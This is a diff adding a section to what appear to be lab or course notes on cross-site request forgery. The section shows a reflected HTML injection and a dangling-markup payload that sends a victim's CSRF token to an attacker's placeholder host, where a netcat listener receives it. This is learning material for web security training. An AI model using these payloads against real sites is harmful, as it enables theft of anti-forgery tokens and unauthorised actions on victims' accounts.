@@ -475,3 +475,50 @@ again our code is executed and the victim's profile is successfully edited
 
 remember that in this example even if there was SSL encryption we would still be able to perform this attack because the anti-csrf token is directly in the URL, so we would only need to be on the local network and sniff this request 
 
+## Cross-Site Request Forgery (POST-based)
+
+in our target we can delete our account and see: 
+
+![](Images/Pasted%20image%2020240305141634.png)
+
+the email is reflected on the page based on the url parameter so lets try inputting some HTML into the value like: 
+
+```html
+<h1>h1<u>underline<%2fu><%2fh1>
+```
+
+![](Images/Pasted%20image%2020240305141805.png)
+
+we can see in the source code that our injection happens before a single quote: 
+
+
+```html
+<h1>h1<u>underline</u></h1></div><input name="csrf" type="hidden" value="e8af075a40001423492508756907fe14644ba70f" meta-dev='testdata'
+```
+
+we can abuse this to leak the csrf token 
+
+lets listen on netcat on port 8000 with `nc -nlvp 8000`
+
+then we can send the following payload to our victim to get the csrf token: 
+
+```html
+<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
+```
+
+`http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`
+
+then as the logged in victim we can visit our malicious site and see the captured request on our netcat listener: 
+
+![](Images/Pasted%20image%2020240305142719.png)
+
+we can see that our code is executed and we get the encoded csrf token for the victim 
+
+remember that this POST request attack doesn't rely on the being in the same local network as the user
+
+also in this scenario even if the site was using secure cookies the attacker would still be able to leak the CSRF token because the connection is what leaks the token 
+
+
+
+
+
